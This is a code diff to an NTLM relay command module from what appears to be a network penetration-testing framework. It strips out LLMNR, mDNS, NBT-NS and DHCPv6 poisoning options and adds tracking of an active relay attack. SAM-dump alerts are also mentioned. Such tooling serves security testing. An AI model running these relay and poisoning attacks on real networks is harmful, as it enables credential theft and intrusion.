@@ -34,7 +34,6 @@ class NtlmRelay(CommandSet):
 
     def __init__(self):
         super().__init__()
-        self.__poison_launcher = None
         self.__smb_relay_server = None
         self.__ntlm_relay_process = None
 
@@ -48,7 +47,6 @@ class NtlmRelay(CommandSet):
         self.__attacks = {"SMB": SMBAttack}
         self.__clients = {"SMB": SMBRelayClient}
         self.__config = None
-        self.__threads = []
 
     def __define_alerts(self):
         """[ Method to define the alert trigger dictionary ]"""
@@ -62,11 +60,6 @@ class NtlmRelay(CommandSet):
         self.__alerts_hunter = Thread(target=self.__display_alerts)
         self.__alerts_hunter.dameon = True
         self.__alerts_hunter.start()
-
-    def __wait_for_threads(self):
-        for thread in self.__threads:
-            thread.join()
-        self.__threads = []
 
     def __display_sam_alert(self):
         """[ Method that displays a message if the sam has been dumped ]"""
@@ -159,11 +152,7 @@ class NtlmRelay(CommandSet):
             args (argparse.Namespace): [ Arguments passed to the attack ]
         """
         self.__checking_attack_options(args)
-        self.__poison_launcher.start_poisoners()
-        print("hola")
-        relay_thread = self.__smb_relay_server.start_smb_relay_server()
-        self.__threads.append(relay_thread)
-        self.__wait_for_threads()
+        self.__smb_relay_server.start_smb_relay_server()
 
     def __synchronous_attack(self):
         """[ Method to perform the attack synchronously ]"""
@@ -282,50 +271,6 @@ class NtlmRelay(CommandSet):
 
         return True
 
-    def __mdns_configuration(self, args: argparse.Namespace) -> None:
-        if args.mdns and not self._cmd.active_attacks_status("MDNS_Poisoning"):
-            self.__poison_launcher.activate_mdns()
-            self._cmd.active_attacks_configure("MDNS_Poisoning", True)
-        else:
-            self._cmd.error_logger.warning(
-                "The mdns poisoning is already being used by another process"
-            )
-
-    def __nbt_ns_configuration(self, args: argparse.Namespace) -> None:
-        if args.nbt_ns and not self._cmd.active_attacks_status("NBT_NS_Poisoning"):
-            self.__poison_launcher.activate_nbt_ns()
-            self._cmd.active_attacks_configure("NBT_NS_Poisoning", True)
-        else:
-            self._cmd.error_logger.warning(
-                "The nbt_ns poisoning is already being used by another process"
-            )
-
-    def __llmnr_configuration(self, args: argparse.Namespace) -> None:
-        if args.llmnr and not self._cmd.active_attacks_status("LLMNR_Poisoning"):
-            self.__poison_launcher.activate_llmnr()
-            self._cmd.active_attacks_configure("LLMNR_Poisoning", True)
-        else:
-            self._cmd.error_logger.warning(
-                "The llmnr poisoning is already being used by another process"
-            )
-
-    def __ipv6_configuration(self, args: argparse.Namespace) -> None:
-        if args.ipv6:
-            self.__poison_launcher.activate_dns()
-            if args.domain != "":
-                self.__poison_launcher.activate_dhcp6()
-            else:
-                self._cmd.error_logger.error(
-                    "Enter the target domain to activate the dhcp6 poisoner.Otherwise the dhcp6 rogue attack could not be activated"
-                )
-
-    def __poison_configuration(self, args: argparse.Namespace) -> dict:
-        self.__mdns_configuration(args)
-        self.__nbt_ns_configuration(args)
-        self.__llmnr_configuration(args)
-        self.__ipv6_configuration(args)
-        self.__threads += self.__poison_launcher.threads
-
     def __creating_components(self, args: argparse.Namespace) -> None:
         """[ Method to configure the classes to use ]
 
@@ -333,17 +278,6 @@ class NtlmRelay(CommandSet):
             args (argparse.Namespace): [ Arguments passed to the attack ]
 
         """
-        self.__poison_launcher = PoisonLauncher(
-            self._cmd.LHOST,
-            self._cmd.IPV6,
-            self._cmd.MAC_ADDRESS,
-            self._cmd.INTERFACE,
-            self._cmd.info_logger,
-            args.Asynchronous,
-            args.domain,
-        )
-        self.__poison_configuration(args)
-
         self.__configure_ntlm_relay_attack(args)
 
         self.__smb_relay_server = ConfigurationSmbRelayServer(
@@ -352,6 +286,9 @@ class NtlmRelay(CommandSet):
             args.Asynchronous,
             self.__alerts_dictionary,
         )
+
+        self._cmd.active_attacks_configure("NTLM_Relay", True)
+
 
     def __wrapper_attack(self, args: argparse.Namespace) -> None:
         """[ Method to launch the attack
@@ -392,6 +329,7 @@ class NtlmRelay(CommandSet):
             self.__ntlm_relay_process.terminate()
             self.__ntlm_relay_process.join()
             self.__ntlm_relay_process = None
+            self._cmd.active_attacks_configure("NTLM_Relay", False)
             if self.__alerts_hunter.is_alive():
                 self._cmd.info_logger.debug("Finishing alerts thread ...")
                 self.__alerts_dictionary["stop"] = 1
@@ -468,34 +406,6 @@ class NtlmRelay(CommandSet):
         "--ipv6",
         action="store_true",
         help="To attack with ipv6",
-    )
-    attack_options.add_argument(
-        "-DOM",
-        "--domain",
-        action="store",
-        type=str,
-        required=False,
-        help="Target domain",
-    )
-
-    poison_options = argParser.add_argument_group(" Options to select the poisoners")
-    poison_options.add_argument(
-        "-L",
-        "--llmnr",
-        action="store_true",
-        help="To use llmnr poisoning",
-    )
-    poison_options.add_argument(
-        "-M",
-        "--mdns",
-        action="store_true",
-        help="To use MDNS poisoning",
-    )
-    poison_options.add_argument(
-        "-N",
-        "--nbt_ns",
-        action="store_true",
-        help="To use NBT_NS poisoning",
     )
 
     @with_argparser(argParser)
